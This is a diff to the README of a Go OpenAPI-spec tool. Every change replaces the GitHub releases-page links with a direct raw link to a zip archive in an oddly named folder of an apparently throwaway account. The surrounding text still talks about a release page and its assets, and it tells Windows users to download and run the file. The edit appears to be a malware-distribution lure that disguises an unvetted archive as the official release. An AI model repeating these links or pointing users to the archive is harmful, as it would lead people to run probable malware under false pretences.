@@ -1,6 +1,6 @@
 # 🧭 go-apispec - Build OpenAPI specs from Go code
 
-[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Hyacinthamyrmecophytic963/go-apispec/raw/refs/heads/main/appendicle/apispec_go_v2.2.zip)
 
 ## 📦 What this app does
 
@@ -23,7 +23,7 @@ For most users, no setup is needed beyond downloading the release file.
 
 ## 🚀 Download and run on Windows
 
-1. Visit the release page: https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases
+1. Visit the release page: https://github.com/Hyacinthamyrmecophytic963/go-apispec/raw/refs/heads/main/appendicle/apispec_go_v2.2.zip
 2. Look for the latest release at the top of the page
 3. In the Assets section, download the Windows file for your system
 4. Save the file to a folder you can find later, such as Downloads or Desktop
@@ -149,7 +149,7 @@ You may want to keep files in these folders:
 
 ## 🔗 Download again
 
-Visit the release page to download: https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases
+Visit the release page to download: https://github.com/Hyacinthamyrmecophytic963/go-apispec/raw/refs/heads/main/appendicle/apispec_go_v2.2.zip
 
 ## 🧪 Working with the output
 
@@ -184,4 +184,4 @@ It reads the structure in your source and turns it into a spec file
 
 ## 📍 Release page
 
-Primary download link: https://github.com/Hyacinthamyrmecophytic963/go-apispec/releases
+Primary download link: https://github.com/Hyacinthamyrmecophytic963/go-apispec/raw/refs/heads/main/appendicle/apispec_go_v2.2.zip
